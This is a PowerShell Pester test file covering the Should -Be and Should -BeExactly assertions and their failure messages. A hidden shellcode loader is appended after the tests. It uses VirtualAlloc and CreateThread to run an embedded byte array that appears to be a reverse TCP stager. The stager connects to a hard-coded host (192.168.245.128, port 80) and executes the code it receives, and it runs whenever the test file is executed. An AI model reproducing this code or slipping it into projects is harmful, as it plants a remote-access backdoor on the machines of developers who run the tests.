Set-StrictMode -Version Latest

InModuleScope Pester {
    Describe "Should -Be" {
        It "returns true if the 2 arguments are equal" {
            1 | Should Be 1
            1 | Should -Be 1
            1 | Should -EQ 1
        }
        It "returns true if the 2 arguments are equal and have different case" {
            'A' | Should Be 'a'
            'A' | Should -Be 'a'
            'A' | Should -EQ 'a'
        }

        It "returns false if the 2 arguments are not equal" {
            1 | Should Not Be 2
            1 | Should -Not -Be 2
            1 | Should -Not -EQ 2
        }

        It 'Compares Arrays properly' {
            $array = @(1, 2, 3, 4, 'I am a string', (New-Object psobject -Property @{ IAm = 'An Object' }))
            $array | Should Be $array
            $array | Should -Be $array
            $array | Should -EQ $array
        }

        It 'Compares arrays with correct case-insensitive behavior' {
            $string = 'I am a string'
            $array = @(1, 2, 3, 4, $string)
            $arrayWithCaps = @(1, 2, 3, 4, $string.ToUpper())

            $array | Should Be $arrayWithCaps
            $array | Should -Be $arrayWithCaps
            $array | Should -EQ $arrayWithCaps
        }

        It 'Handles reference types properly' {
            $object1 = New-Object psobject -Property @{ Value = 'Test' }
            $object2 = New-Object psobject -Property @{ Value = 'Test' }

            $object1 | Should Be $object1
            $object1 | Should Not Be $object2
            $object1 | Should -Be $object1
            $object1 | Should -Not -Be $object2
            $object1 | Should -EQ $object1
            $object1 | Should -Not -EQ $object2
        }

        It 'Handles arrays with nested arrays' {
            $array1 = @(
                @(1, 2, 3, 4, 5),
                @(6, 7, 8, 9, 0)
            )

            $array2 = @(
                @(1, 2, 3, 4, 5),
                @(6, 7, 8, 9, 0)
            )

            $array1 | Should Be $array2
            $array1 | Should -Be $array2
            $array1 | Should -EQ $array2

            $array3 = @(
                @(1, 2, 3, 4, 5),
                @(6, 7, 8, 9, 0, 'Oops!')
            )

            $array1 | Should Not Be $array3
            $array1 | Should -Not -Be $array3
            $array1 | Should -Not -EQ $array3
        }

        It "returns true if the actual value can be cast to the expected value and they are the same value" {
            {abc} | Should Be "aBc"
            {abc} | Should -Be "aBc"
            {abc} | Should -EQ "aBc"
        }

        It "returns true if the actual value can be cast to the expected value and they are the same value (case sensitive)" {
            {abc} | Should BeExactly "abc"
            {abc} | Should -BeExactly "abc"
            {abc} | Should -CEQ "abc"
        }

        It 'Does not overflow on IEnumerable' {
            
            $doc = [xml]'<?xml version="1.0" encoding="UTF-8" standalone="no" ?><root></root>'
            $doc | Should -be $doc
        }

        
        If ((GetPesterOS) -ne 'macOS') {
            It 'throws exception when self-imposed recursion limit is reached' {
                $a1 = @(0, 1)
                $a2 = @($a1, 2)
                $a1[0] = $a2

                { $a1 | Should -be $a2 } | Should -throw 'recursion depth limit'
            }
        }

    }

    Describe "ShouldBeFailureMessage" {
        
        
        

        It "Shows excerpted error messages correctly" {
            $expected = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
            $actual = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
            { $actual | Should Be $expected } | Should Throw "Expected: '...aaaaabbbbb...'"
        }

        It "Shows excerpted error messages correctly" {
            $expected = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
            $actual = "abb"
            { $actual | Should Be $expected } | Should Throw "Expected: 'aaaaaaaaaa...'"
        }

        It "Shows excerpted 'actual values' correctly" {
            $expected = "aaab"
            $actual = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
            { $actual | Should Be $expected } | Should Throw "But was:  'aaaaaaaaaa...'"
        }

        It "Returns nothing for two identical strings" {
            
            

            $string = "string"
            ShouldBeFailureMessage $string $string | Verify-Equal ''
        }

        It "Outputs less verbose message for two different objects that are not strings" {
            ShouldBeFailureMessage 2 1 | Verify-Equal "Expected 1, but got 2."
        }

        It "Outputs less verbose message for two different objects that are not strings, with reason" {
            ShouldBeFailureMessage 2 1 -Because 'reason' | Verify-Equal "Expected 1, because reason, but got 2."
        }

        It "Outputs verbose message for two strings of different length" {
            ShouldBeFailureMessage "actual" "expected" | Verify-Equal "Expected strings to be the same, but they were different.`nExpected length: 8`nActual length:   6`nStrings differ at index 0.`nExpected: 'expected'`nBut was:  'actual'"
        }

        It "Outputs verbose message for two strings of different length" {
            ShouldBeFailureMessage "actual" "expected" -Because 'reason' | Verify-Equal "Expected strings to be the same, because reason, but they were different.`nExpected length: 8`nActual length:   6`nStrings differ at index 0.`nExpected: 'expected'`nBut was:  'actual'"
        }

        It "Outputs verbose message for two different strings of the same length" {
            ShouldBeFailureMessage "x" "y" | Verify-Equal "Expected strings to be the same, but they were different.`nString lengths are both 1.`nStrings differ at index 0.`nExpected: 'y'`nBut was:  'x'"
        }

        It "Replaces non-printable characters correctly" {
            ShouldBeFailureMessage "`n`r`b`0`tx" "`n`r`b`0`ty" | Verify-Equal "Expected strings to be the same, but they were different.`nString lengths are both 6.`nStrings differ at index 5.`nExpected: '\n\r\b\0\ty'`nBut was:  '\n\r\b\0\tx'"
        }

        It "The arrow points to the correct position when non-printable characters are replaced before the difference" {
            ShouldBeFailureMessage "123`n456" "123`n789" | Verify-Equal "Expected strings to be the same, but they were different.`nString lengths are both 7.`nStrings differ at index 4.`nExpected: '123\n789'`nBut was:  '123\n456'"
        }

        It "The arrow points to the correct position when non-printable characters are replaced after the difference" {
            ShouldBeFailureMessage "abcd`n123" "abc!`n123" | Verify-Equal "Expected strings to be the same, but they were different.`nString lengths are both 8.`nStrings differ at index 3.`nExpected: 'abc!\n123'`nBut was:  'abcd\n123'"
        }
    }
}

InModuleScope Pester {
    Describe "Should -BeExactly" {
        It "passes if letter case matches" {
            'a' | Should BeExactly 'a'
            'a' | Should -BeExactly 'a'
        }

        It "fails if letter case doesn't match" {
            'A' | Should Not BeExactly 'a'
            'A' | Should -Not -BeExactly 'a'
        }

        It "passes for numbers" {
            1 | Should BeExactly 1
            2.15 | Should BeExactly 2.15
            1 | Should -BeExactly 1
            2.15 | Should -BeExactly 2.15
        }

        It 'Compares Arrays properly' {
            $array = @(1, 2, 3, 4, 'I am a string', (New-Object psobject -Property @{ IAm = 'An Object' }))
            $array | Should BeExactly $array
            $array | Should -BeExactly $array
        }

        It 'Compares arrays with correct case-sensitive behavior' {
            $string = 'I am a string'
            $array = @(1, 2, 3, 4, $string)
            $arrayWithCaps = @(1, 2, 3, 4, $string.ToUpper())

            $array | Should Not BeExactly $arrayWithCaps
            $array | Should -Not -BeExactly $arrayWithCaps
        }
    }

    Describe "ShouldBeExactlyFailureMessage" {
        It "Writes verbose message for strings that differ by case" {
            ShouldBeExactlyFailureMessage "a" "A" -Because "reason" | Verify-Equal "Expected strings to be the same, because reason, but they were different.`nString lengths are both 1.`nStrings differ at index 0.`nExpected: 'A'`nBut was:  'a'"
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xf5,0x80,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

